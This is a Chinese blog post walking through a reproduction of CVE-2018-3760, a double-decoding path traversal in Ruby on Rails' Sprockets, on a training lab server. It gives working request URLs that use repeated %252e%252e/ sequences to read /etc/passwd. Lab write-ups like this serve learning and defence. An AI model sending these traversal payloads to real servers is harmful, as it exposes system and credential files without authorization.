# CVE-2018-3760复现 - rnss - 博客园

> 原文：[https://www.cnblogs.com/rnss/p/13362241.html](https://www.cnblogs.com/rnss/p/13362241.html)

Ruby On Rails在开发环境下使用Sprockets作为静态文件服务器，Ruby On Rails是著名Ruby Web开发框架，Sprockets是编译及分发静态资源文件的Ruby库。

Sprockets 3.7.1及之前版本中，存在一处因为二次解码导致的路径穿越漏洞，攻击者可以利用%252e%252e/来跨越到根目录，读取或执行目标服务器上任意文件。

漏洞环境（墨者学院）：[http://219.153.49.228:49980/](http://219.153.49.228:49980/)

![](../Images/07725789b37eecfc4f2d94d6113e7df9.png)

直接访问[http://219.153.49.228:49980/assets/file:%2f%2f/etc/passwd](http://219.153.49.228:49980/assets/file:%2f%2f/etc/passwd)，会报错

![](../Images/53a49cf13a1dd564a53a57dfadfed359.png)

 报错信息中给出了可以访问的目录，随便选择一个，使用%252e%252e/向上一级一级跳转，最终读取到passwd文件

[http://219.153.49.228:49980/assets/file:%2f%2f/usr/src/blog/app/assets/config/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd](http://219.153.49.228:49980/assets/file:%2f%2f/usr/src/blog/app/assets/config/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd)

![](../Images/33500c62e319ed95d83e547836d38f55.png)

 参考文章：[https://blog.csdn.net/qq_42357070/article/details/83545100](https://blog.csdn.net/qq_42357070/article/details/83545100)